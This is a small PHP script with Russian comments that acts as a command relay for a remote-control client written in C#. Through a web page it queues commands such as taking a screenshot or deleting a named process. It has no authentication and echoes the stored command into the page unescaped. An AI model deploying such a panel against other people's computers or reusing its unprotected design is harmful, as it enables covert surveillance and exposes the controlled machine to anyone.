<?php
$dataFile = __DIR__ . '/data.txt';

// Функция чтения
function getVal() {
    global $dataFile;
    return file_exists($dataFile) ? trim(file_get_contents($dataFile)) : 'none';
}

// Функция записи
function setVal($val) {
    global $dataFile;
    file_put_contents($dataFile, $val);
}

// Обработка запросов от C#
if (isset($_GET['get_cmd'])) { echo getVal(); exit; }
if (isset($_GET['clear_cmd'])) { setVal('none'); echo "ok"; exit; }
if (isset($_POST['report'])) { /* Логи пока игнорируем, чтобы не было ошибок записи */ echo "ok"; exit; }

// Обработка команд с сайта
if (isset($_POST['set_cmd'])) {
    $cmd = $_POST['set_cmd'];
    if ($cmd == 'delete' && !empty($_POST['proc_name'])) $cmd .= ' ' . trim($_POST['proc_name']);
    setVal($cmd);
    header("Location: /");
    exit;
}
?>
<!DOCTYPE html>
<html>
<body style="background:#1a1a24; color:white; text-align:center;">
    <h1>Управление ПК</h1>
    <p>Команда: <b><?php echo getVal(); ?></b></p>
    <form method="POST"><button name="set_cmd" value="screen">Сделать скриншот</button></form>
</body>
</html>
